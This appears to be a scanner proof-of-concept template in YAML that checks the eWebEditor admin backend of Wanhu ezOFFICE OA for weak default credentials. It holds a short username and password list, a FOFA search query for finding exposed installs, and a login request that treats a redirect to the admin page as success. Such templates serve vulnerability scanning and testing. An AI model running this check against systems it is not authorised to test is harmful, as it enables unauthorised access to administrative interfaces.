id: poc-yaml-whir-ezoffice-ewebeditor-weak-password
info:
  name: 万户 ezOFFICE eWebEditor 编辑后台弱口令漏洞
  severity: high
  tags:
  - 弱口令
  finger: 万户OA ezoffice
  fofa: app="万户网络-ezOFFICE"
variables:
  user: 'admin

    ezoffice

    '
  passwd: 'admin

    ezoffice

    qwertyuiop123

    '
firstRequest:
  method: GET
  path: /defaultroot/public/edit/admin/login.jsp
  expression: status_code == 200 && contains(gbk_decode(body),"eWebEditor在线编辑器")
requests:
- method: POST
  path: /defaultroot/public/edit/admin/login.jsp?action=login
  headers:
    Content-Type: application/x-www-form-urlencoded
  data: usr={{.user}}&pwd={{.passwd}}
  expression: status_code == 302 && contains(headers,"/defaultroot/public/edit/admin/default.jsp")
transport: http
